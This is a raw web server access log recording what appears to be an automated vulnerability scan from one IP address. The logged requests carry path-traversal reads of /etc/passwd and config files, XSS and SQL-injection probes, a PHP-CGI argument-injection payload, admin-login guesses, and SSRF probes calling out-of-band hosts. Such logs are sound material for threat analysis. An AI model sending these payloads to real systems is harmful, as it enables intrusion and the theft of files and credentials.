179.43.161.218 - - [06/Jun/2025:13:33:01 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/config/nodogsplash HTTP/1.1" 400 157 "-" "-" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /195.bz2 HTTP/1.1" 404 14 "-" "Mozilla/5.0 (CentOS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /carbon/admin/login.jsp HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Kubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /cyble.svg?ZYu3m=x HTTP/1.1" 400 157 "-" "-" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /pages/login HTTP/1.1" 404 14 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /.dbeaver/data-sources.json HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /nonauth/expiration.cs?dest=VGVzdA0KQ1JMRjo%3d HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /web-console/ServerInfo.jsp HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /public/plugins/natel-usgs-datasource/../../../../../conf/defaults.ini HTTP/1.1" 400 157 "-" "-" "-"
159.89.211.52 - xampp [07/Jun/2025:08:53:33 +0000] "GET /manager/html HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /actuator/logfile HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.9.25" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /wp-content/uploads/wpjobboard/ HTTP/1.1" 404 14 "-" "Mozilla/5.0 (CentOS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /cyble.svg?ZYu3m=x HTTP/1.1" 400 157 "-" "-" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /wp-content/plugins/members-list/admin/view/user.php?page=%22%3E%3Cimg%20src%20onerror=alert(document.domain)%20x HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.79" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /cgi-bin/welcome HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /static/shards.html HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_1_4; en-US) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /system/deviceInfo?auth=YWRtaW46MTEK HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Debian; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /orchard/Users/Account/LogOff?ReturnUrl=%2f%2fhttp://interact.sh%3f HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /login/?redirectTo=/tenant/e&service=</script><script>alert(document.domain)</script> HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /avatar/1%3fd%3dhttp%3A%252F%252Fimgur.com%252F..%25252F1.1.1.1 HTTP/1.1" 404 14 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/117.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /resumes/?s=%22%3E%3Cimg+src%3Dx+onerror%3Dalert(document.domain)%3E HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Debian; Linux i686; rv:123.0) Gecko/20100101 Firefox/123.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /product.php?cid=1&&artname=%3Cimg%20src=1%20onerror=alert(document.domain)%3E HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /redfish/v1/ HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.4.27" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /wp-content/plugins/123contactform-for-wordpress/ HTTP/1.1" 404 14 "-" "Mozilla/5.0 (SS; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /fastcgi.conf HTTP/1.1" 404 14 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.6) Gecko/20100628 Ubuntu/10.04 (lucid) Firefox/3.6.6" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /pem/login/pages/login.jsf HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17 Safari/605.1.15" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET / HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /ssh_access.txt.x HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.4.16" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /index.php?option=com_powermail&controller=../../../../../../../../../../etc/passwd%00 HTTP/1.1" 404 14 "-" "Mozilla/5.0 (SS; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /public/plugins/marcusolsson-ynab-datasource/../../../../../conf/defaults.ini HTTP/1.1" 400 157 "-" "-" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /ui/ HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Debian; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /404 HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /public/plugins/netsage-bumpchart-panel/../../../../../conf/defaults.ini HTTP/1.1" 400 157 "-" "-" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /wp-content/plugins/mstore-api/ HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /?author=1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Knoppix; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /server HTTP/1.1" 404 14 "-" "Mozilla/5.0 (SS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /?s=QGZcUW%3CIMG%20%22%22%22%3E%3CIMG%20SRC=/%20onerror=%22alert(document.domain)%22%3E%3C/img%3E/QOi/ HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /wp-content/plugins/wp-custom-pages/wp-download.php?url=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /public/plugins/monasca-datasource/../../../../../conf/defaults.ini HTTP/1.1" 400 157 "-" "-" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /system/console HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.14" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /usr/share/doc/libphp-jpgraph-examples/examples/show-source.php%3ftarget=/etc/passwd&ooo HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /.well-known/openid-configuration/jwks.json HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /hss/?q=%27%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14) AppleWebKit/617.14 (KHTML, like Gecko) Version/17.4.63 Safari/617.14" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /rest/api/2/projectCategory?maxResults=1000 HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /external_content/retrieve/oembed?endpoint=http://d11vrvvlqhfdrjvik8kgu7w9kqkwqyecx.oast.fun&url=foo HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /fmlurlsvc/?url=https%3A%2F%2Fgoogle.com<Svg%2Fonload%3Dalert(document.domain)> HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /Visitor//%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fwindows%5Cwin.ini HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Ubuntu; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /axis/ HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/617.2.4.11.12" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /index.php?option=com_awdwall&controller=../../../../../../../../../../etc/passwd%00 HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0.1 Safari/605.1.15" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /wp-admin/maint/repair.php HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /comment/api/index.php?gid=1&page=2&rlist[]=@`%27`,%20extractvalue(1,%20concat_ws(0x20,%200x5c,(select%20md5(999999999)))),@`%27` HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Debian; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /wicket/resource/nl.planon.pssm.dashboard.cre.engine.wicket.page.AbstractDashboardPage/html/nodata.html?nodatamsg=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /static/images/favicon.ico HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /_framework/blazor.boot.json HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /javax.faces.resources/faces-config.xml.jsf?loc=/../../WEB-INF HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /Images/Remote?imageUrl=https://oast.me/ HTTP/1.1" 404 14 "-" "Mozilla/5.0 (SS; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /SphinxAuth/Account/Login HTTP/1.1" 404 14 "-" "Mozilla/5.0 (ZZ; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36" "-"
159.89.211.52 - manager [07/Jun/2025:08:53:33 +0000] "GET /manager/html HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /https:/oast.me HTTP/1.1" 404 14 "-" "Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "POST /test.hello?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.3) AppleWebKit/616.20.13 (KHTML, like Gecko) Version/17.7.74 Safari/616.20.13" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /cpanelwebcall/%3Cimg%20src=x%20onerror=%22prompt%28document.domain%29%22%3Eaaaaaaaaaaaa HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Safari/605.1.1" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /env.development.js HTTP/1.1" 404 14 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /awcuser/cgi-bin/vcs_access_file.cgi?file=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17 Safari/605.1.15" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /tabella.php?jkuh3%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Eyql8b=1 HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.1) AppleWebKit/616.8 (KHTML, like Gecko) Version/17.2.12 Safari/616.8" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /db/schema.rb HTTP/1.1" 404 14 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.7 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /msa/main.xp?Fun=msaDataCenetrDownLoadMore+delflag=1+downLoadFileName=msagroup.txt+downLoadFile=../../../../../../etc/passwd HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /public/plugins/marcusolsson-gantt-panel/../../../../../conf/defaults.ini HTTP/1.1" 400 157 "-" "-" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET / HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Debian; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /recent_scans/ HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Knoppix; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /ssf/s/portalLogin HTTP/1.1" 404 14 "-" "Mozilla/5.0 (CentOS; Linux i686; rv:124.0) Gecko/20100101 Firefox/124.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /cyble.svg?ZYu3m=x HTTP/1.1" 404 14 "-" "-" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /wp-content/plugins/admin-word-count-column/download-csv.php?path=../../../../../../../../../../../../etc/passwd\x5C0 HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET / HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /client/ HTTP/1.1" 404 14 "-" "Mozilla/5.0 (CentOS; Linux i686; rv:127.0) Gecko/20100101 Firefox/127.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /domcfg.nsf HTTP/1.1" 404 14 "-" "Mozilla/5.0 (ZZ; Linux i686; rv:123.0) Gecko/20100101 Firefox/123.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /?phpinfo=-1 HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/17.4" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /195.53.bz2 HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Kubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /jolokia/read/Users:database=UserDatabase,type=UserDatabase HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.5.20" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /79.137.bz2 HTTP/1.1" 404 14 "-" "Mozilla/5.0 (CentOS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /metrics HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "POST /index.php?controller=pjAdmin&action=%3Cimg+src%3Dx+onerror%3Dprompt%28document.domain%29%3E HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /payform.php?type=upgrade&upgradeid=1&upgradegd=6&price=123&t=1&note=%3C/textarea%3E%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1.2 Safari/605.1.15" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "POST /mgmt/shared/authn/login HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Kubuntu; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /src.7z HTTP/1.1" 404 14 "-" "Mozilla/5.0 (CentOS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /wp-content/plugins/localize-my-post/ajax/include.php?file=../../../../../../../../../../etc/passwd HTTP/1.1" 404 14 "-" "Mozilla/5.0 (ZZ; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
159.89.211.52 - QCC [07/Jun/2025:08:53:33 +0000] "GET /manager/html HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Kubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /auth.php HTTP/1.1" 404 14 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /mediation/domains HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Kubuntu; Linux i686; rv:125.0) Gecko/20100101 Firefox/125.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /public/plugins/linksmart-sensorthings-datasource/../../../../../conf/defaults.ini HTTP/1.1" 400 157 "-" "-" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /public/plugins/mtanda-google-calendar-datasource/../../../../../conf/defaults.ini HTTP/1.1" 400 157 "-" "-" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /?case=crossall&act=execsql&sql=WY8gzSfZwW9R5YvyK HTTP/1.1" 404 14 "-" "Mozilla/5.0 (ZZ; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /%3Cstyle%20onload=alert%28document.domain%29%3E../../ HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Knoppix; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET / HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063" "-"
159.89.211.52 - ADMIN [07/Jun/2025:08:53:33 +0000] "GET /manager/html HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.63" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /tiki-login.php HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.7.23" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /VirtualEms/Login.aspx HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 10.0; rv:127.0) Gecko/20100101 Firefox/127.0" "-"
159.89.211.52 - - [07/Jun/2025:08:53:33 +0000] "GET /weaver/weaver.file.SignatureDownLoad?markId=0%20union%20select%20%27../ecology/WEB-INF/prop/weaver.properties%27 HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Ubuntu; Linux i686; rv:125.0) Gecko/20100101 Firefox/125.0" "-"
